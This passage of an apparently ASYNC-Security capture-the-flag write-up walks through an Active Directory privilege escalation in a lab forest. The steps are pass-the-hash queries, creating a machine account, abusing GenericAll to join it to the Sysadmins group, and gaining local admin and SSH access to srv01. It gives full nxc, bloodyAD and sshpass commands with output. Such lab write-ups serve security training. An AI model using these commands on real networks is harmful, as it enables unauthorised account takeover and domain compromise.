+<p>As we did before to enumerate the <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> on <code class="language-plaintext highlighter-rouge">antennae.rv</code>, we can do the same for <code class="language-plaintext highlighter-rouge">backward.rv</code>. Due to the bidirectional trust, we can use the credentials of any user in <code class="language-plaintext highlighter-rouge">antennae.rv</code> to query <code class="language-plaintext highlighter-rouge">backward.rv</code>. In this case, we’ll use the credentials of <code class="language-plaintext highlighter-rouge">natasha.lim</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'natasha.lim' -H '0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' -M maq
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:antennae.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] antennae.rv\natasha.lim:0a1bc6b13cd3106322a6d5bbb0293e44 
+MAQ         10.5.10.12      389    DC02             [*] Getting the MachineAccountQuota
+MAQ         10.5.10.12      389    DC02             MachineAccountQuota: 10
+</code></pre></div></div>
+
+<p>We can create a new computer account in <code class="language-plaintext highlighter-rouge">backward.rv</code>, using <code class="language-plaintext highlighter-rouge">natasha.lim</code>’s credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc02.backward.rv -u 'natasha.lim' -H '0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' -M add-computer -o NAME="gatari$" PASSWORD='P@ssw0rd' 
+SMB         10.5.10.12      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:backward.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.12      445    DC02             [+] antennae.rv\natasha.lim:0a1bc6b13cd3106322a6d5bbb0293e44 
+ADD-COMP... 10.5.10.12      445    DC02             Successfully added the machine account: "gatari$" with Password: "P@ssw0rd"
+</code></pre></div></div>
+
+<h2 id="abusing-genericall-on-group-again">Abusing GenericAll on Group, again</h2>
+
+<p>Now that we have a computer account in <code class="language-plaintext highlighter-rouge">backward.rv</code>, we can use the <code class="language-plaintext highlighter-rouge">GenericAll</code> permissions that the <code class="language-plaintext highlighter-rouge">Maintainers</code> group has on the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group to add our computer account to the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ bloodyAD --host 'dc02.backward.rv' -u 'natasha.lim' -p ':0a1bc6b13cd3106322a6d5bbb0293e44' -d 'antennae.rv' add groupMember 'sysadmins' 'gatari$'                                          
+[+] gatari$ added to sysadmins
+</code></pre></div></div>
+
+<p>We can verify that our computer account is indeed a member of the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'gatari$' -p 'P@ssw0rd' -M whoami                                                        
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\gatari$:P@ssw0rd 
+WHOAMI      10.5.10.12      389    DC02             Name: gatari
+WHOAMI      10.5.10.12      389    DC02             sAMAccountName: gatari$
+WHOAMI      10.5.10.12      389    DC02             Enabled: Yes
+WHOAMI      10.5.10.12      389    DC02             Password Never Expires: No
+WHOAMI      10.5.10.12      389    DC02             Last logon: Never
+WHOAMI      10.5.10.12      389    DC02             Password Last Set: Never
+WHOAMI      10.5.10.12      389    DC02             Bad Password Count: 0
+WHOAMI      10.5.10.12      389    DC02             Distinguished Name: CN=gatari,CN=Computers,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             Member of: CN=Sysadmins,CN=Users,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             User SID: S-1-5-21-2163652167-2436585246-2491459670-1605
+</code></pre></div></div>
+
+<h2 id="local-administrator">Local Administrator</h2>
+
+<p>Now that we are part of the <code class="language-plaintext highlighter-rouge">sysadmins</code> group, we can enumerate for local administrator access on machines in the <code class="language-plaintext highlighter-rouge">backward.rv</code> domain. We can do this with <code class="language-plaintext highlighter-rouge">nxc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb srv01.backward.rv -u 'gatari$' -p 'P@ssw0rd'                                                                                                  
+SMB         10.5.10.13      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:backward.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.13      445    SRV01            [+] backward.rv\gatari$:P@ssw0rd (Pwn3d!)
+</code></pre></div></div>
+
+<p>The presence of the <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code> message indicates that <code class="language-plaintext highlighter-rouge">gatari$</code> has local administrator access on <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code>. This is likely because the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group is a member of the <code class="language-plaintext highlighter-rouge">Administrators</code> group on <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code>. We can <code class="language-plaintext highlighter-rouge">SSH</code> into <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code> as <code class="language-plaintext highlighter-rouge">gatari$</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ sshpass -p 'P@ssw0rd' ssh 'gatari$'@srv01.backward.rv
+PS C:\Users\gatari$&gt; whoami
+backward\gatari$
+</code></pre></div></div>
+
+<p>And grab <code class="language-plaintext highlighter-rouge">flag7.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\gatari$&gt; cat C:\Users\Administrator\Desktop\flag7.txt
+RV{f0r3I6n_GRoUP_mEMBeRSH1p_!$_pR3t7Y_4nNoyin9_549d3e2a7fd475283f4ce5f93f489a76}
+</code></pre></div></div>
+
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+
+        if (content.classList.contains('expanded')) {
+            content.classList.remove('expanded');
+            button.classList.remove('expanded');
+            button.innerHTML = 'Table of Contents';
+        } else {
+            content.classList.add('expanded');
+            button.classList.add('expanded');
+            button.innerHTML = 'Table of Contents';
+        }
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        miniToc.classList.toggle('minimized');
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        
+        const existingToc = document.querySelector('.toc-content');
+        
+        if (existingToc && existingToc.innerHTML.trim()) {
+            const tocClone = existingToc.cloneNode(true);
+            
+            tocClone.classList.remove('toc-content', 'expanded');
+            tocClone.removeAttribute('id');
+            
+            const links = tocClone.querySelectorAll('a');
+            links.forEach(link => {
+                link.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const href = link.getAttribute('href');
+                    if (href && href.startsWith('#')) {
+                        const targetElement = document.querySelector(href);
+                        if (targetElement) {
+                            targetElement.scrollIntoView({
+                                behavior: 'smooth',
+                                block: 'start'
+                            });
+                        }
+                    }
+                });
+            });
+            
+            miniTocContent.appendChild(tocClone);
+            miniToc.classList.add('visible');
+            
+            setupActiveHighlighting(links);
+        } else {
+            generateTocFromHeadings();
+        }
+    }
+
+    function generateTocFromHeadings() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const headings = document.querySelectorAll('h1, h2, h3, h4, h5, h6');
+        
+        if (headings.length === 0) {
+            return;
+        }
+
+        const ul = document.createElement('ul');
+        
+        headings.forEach((heading, index) => {
+            if (!heading.id) {
+                heading.id = `heading-${index}`;
+            }
+
+            const li = document.createElement('li');
+            const a = document.createElement('a');
+            a.href = `#${heading.id}`;
+            a.textContent = heading.textContent;
+            
+            li.appendChild(a);
+            ul.appendChild(li);
+        });
+
+        miniTocContent.appendChild(ul);
+        miniToc.classList.add('visible');
+
+        ul.addEventListener('click', (e) => {
+            if (e.target.tagName === 'A') {
+                e.preventDefault();
+                const targetId = e.target.getAttribute('href').substring(1);
+                const targetElement = document.getElementById(targetId);
+                if (targetElement) {
+                    targetElement.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            }
+        });
+
+        setupActiveHighlighting(ul.querySelectorAll('a'));
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                return {
+                    link: link,
+                    element: document.querySelector(href)
+                };
+            }
+            return null;
+        }).filter(item => item && item.element);
+
+        if (targets.length === 0) return;
+
+        function updateActiveSection() {
+            const scrollPosition = window.scrollY + 100;
+            let activeTarget = null;
+
+            targets.forEach(target => {
+                if (target.element.offsetTop <= scrollPosition) {
+                    activeTarget = target;
+                }
+            });
+
+            links.forEach(link => {
+                link.classList.remove('active');
+            });
+
+            if (activeTarget) {
+                activeTarget.link.classList.add('active');
+            }
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => {
+                    updateActiveSection();
+                    ticking = false;
+                });
+                ticking = true;
+            }
+        });
+
+        updateActiveSection();
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/ASYNC-Security">ASYNC-Security</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
